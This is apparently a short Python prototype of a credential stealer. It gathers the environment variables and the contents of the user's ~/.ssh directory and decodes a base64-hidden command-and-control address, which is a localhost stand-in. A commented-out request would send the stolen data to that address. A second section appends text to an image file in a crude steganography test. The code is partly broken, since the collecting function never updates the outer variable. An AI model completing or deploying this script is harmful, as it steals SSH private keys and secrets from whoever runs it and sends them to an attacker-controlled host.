import os, requests, base64

#do some recon
env_info = os.environ


#totally secure c2 ip

c2 = "aHR0cDovLzEyNy4wLjAuMTo4MDgw"

package = "/?env=" + str(env_info) + "/?ssh="

#get ssh keys
def dump(from_dir):
  for root_dir, _, filenames in os.walk(from_dir):
    for filename in filenames:
      path = os.path.join(root_dir, filename)
      with open(path) as f:
        package += f.read()

try:
  home = os.environ['HOME']
  dump(os.path.join(home, '.ssh'))
except:
  pass

print(base64.b64decode(c2).decode("utf-8")) 

#response = requests.get(base64.b64decode(c2).decode("utf-8").strip() + package)

from stegano import lsb

# hide text to image
path = "stego.jpg"
text = 'The quick brown fox jumps over the lazy dog.'
with open(path, "ab") as f:
    f.write(text.encode('utf8'))

with open(path, "rb") as f:
    for chunk in iter(lambda: f.read(len(text)), b''):
        print(chunk.decode('utf-8', errors="ignore"), end="")